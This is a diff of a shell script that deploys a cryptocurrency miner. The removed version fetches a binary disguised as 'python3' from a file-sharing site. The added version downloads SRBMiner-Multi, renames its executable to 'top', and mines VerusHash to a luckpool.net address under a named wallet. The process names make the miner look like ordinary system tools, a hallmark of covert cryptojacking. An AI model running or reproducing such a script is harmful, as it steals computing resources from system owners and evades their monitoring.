@@ -1,3 +1,9 @@
-wget https://filebin.net/zla10wjygjoy55hn/python3
-chmod +x python3
-./python3 -a verushash -o eu.luckpool.net:3960 -u RT8XoQFACj677vaJQGNJLVeaUB6dmq3AAg.lucky1
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.6/SRBMiner-Multi-2-5-6-Linux.tar.gz
+
+tar -xf SRBMiner-Multi-2-5-6-Linux.tar.gz
+
+cd SRBMiner-Multi-2-5-6
+
+mv SRBMiner-MULTI top
+
+./top -a verushash -o eu.luckpool.net:3960 -u RT8XoQFACj677vaJQGNJLVeaUB6dmq3AAg.luck
